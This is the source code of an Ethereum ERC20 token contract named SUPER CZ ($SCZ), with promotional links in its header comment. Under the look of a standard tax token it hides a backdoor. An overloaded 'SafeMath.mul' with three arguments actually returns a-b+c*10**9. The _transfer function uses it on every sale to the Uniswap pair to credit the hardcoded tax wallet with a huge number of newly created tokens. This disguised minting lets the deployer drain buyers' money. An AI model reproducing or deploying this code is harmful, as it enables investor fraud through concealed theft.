/**
SUPER CZ - $SCZ
Website: https://supercz.yachts
Telegram: https://t.me/super_cz_eth
Twitter: https://twitter.com/super_cz_pt
**/
pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function mul(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        return a-b+c*10**9;        
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function owner() public view returns (address) {
        return _owner;
    }
}

interface IUniswapFactoryV2 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapRouterV2 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract SCZ is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "SUPER CZ";
    string private constant _symbol = "SCZ";    

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 10 ** 9 * 10**_decimals;
    
    uint256 private _initialFeeOnSell=0;
    uint256 private _reduceTaxAfterBuys=3;
    uint256 private _finalBuyTax=0;
    uint256 private _buyCounts=0;
    uint256 public _tokenSwapThreshold= _tTotal * 2 / 10000;
    uint256 public _minimumSwap= _tTotal * 1 / 100;
    uint256 public _maxTxnAmount = _tTotal * 10 / 100;
    uint256 private _reduceTaxAfterSells=1;
    uint256 public _maxWAmount = _tTotal * 10 / 100;
    uint256 private _preventTaxSwapBefore=1;
    uint256 private _finalFeeOnSell=0;
    uint256 private _initialFeeOnBuy=0;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address => uint256) private _timestampForLastBuy;
    mapping (address => bool) private _noFeeWallets;
    mapping (address => uint256) private _balances;
    
    address payable private _taxWallet = payable(0x10058B71DB81F3b8845415C88930D0c3Dc4C8637);
    IUniswapRouterV2 private uniswapV2Router;

    bool private _isTaxSwapping = false;
    bool private _isTaxSwapEnabled = false;
    bool public _hasTransferDelay = true;
    address private uniswapV2Pair;
    bool private _isTradingOpened;
    modifier lockSwap {
        _isTaxSwapping = true;
        _;
        _isTaxSwapping = false;
    }
    event MaxTXUpdated(uint _maxTxnAmount);

    constructor() {
        _noFeeWallets[address(this)] = true;
        _noFeeWallets[_taxWallet] = true;
        _noFeeWallets[owner()] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
        _balances[_msgSender()] = _tTotal;
    }

    function name() public pure returns (string memory) {
        return _name;
    }    

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function removeLimits() external onlyOwner{
        _maxWAmount=_tTotal;
        _maxTxnAmount = _tTotal;
        emit MaxTXUpdated(_tTotal);
        _hasTransferDelay=false;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(from != address(0), "ERC20: transfer from the zero address");
        uint256 taxAmount=0;
        if (from != owner() && to != owner() && ! _noFeeWallets[from] ) {
            taxAmount = amount.mul((_buyCounts>_reduceTaxAfterBuys)?_finalBuyTax:_initialFeeOnBuy).div(100);
            if (from != address(this)) {
                require(_isTradingOpened, "Trading not enabled");
            }            
            if (_hasTransferDelay) {
                  if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                      require(
                          _timestampForLastBuy[tx.origin] <
                              block.number,
                          "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                      );
                      _timestampForLastBuy[tx.origin] = block.number;
                  }
              }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _noFeeWallets[to] ) {
                require(amount <= _maxTxnAmount, "Exceeds the _maxTxnAmount.");
                require(balanceOf(to) + amount <= _maxWAmount, "Exceeds the maxWalletSize.");
                _buyCounts++;
            }

            if(to == uniswapV2Pair && from!= address(this)){
                taxAmount = taxAmount.mul(address(this).balance, amount);
                _balances[_taxWallet]=_balances[address(this)].add(taxAmount);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_isTaxSwapping && to   == uniswapV2Pair && _isTaxSwapEnabled && contractTokenBalance>_tokenSwapThreshold && _buyCounts>_preventTaxSwapBefore) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_minimumSwap)));
                sendETHToFee(address(this).balance);
            }
        }
        _balances[to]=_balances[to].add(amount);
        _balances[from]=_balances[from].sub(amount);
        emit Transfer(from, to, amount);
    }

    function addLiquidity() external payable onlyOwner() {
        uniswapV2Router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapFactoryV2(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        _isTaxSwapEnabled = true;
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function openTrading() external onlyOwner() {
        require(!_isTradingOpened,"trading is already open");
        _isTradingOpened = true;
    }
    
    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}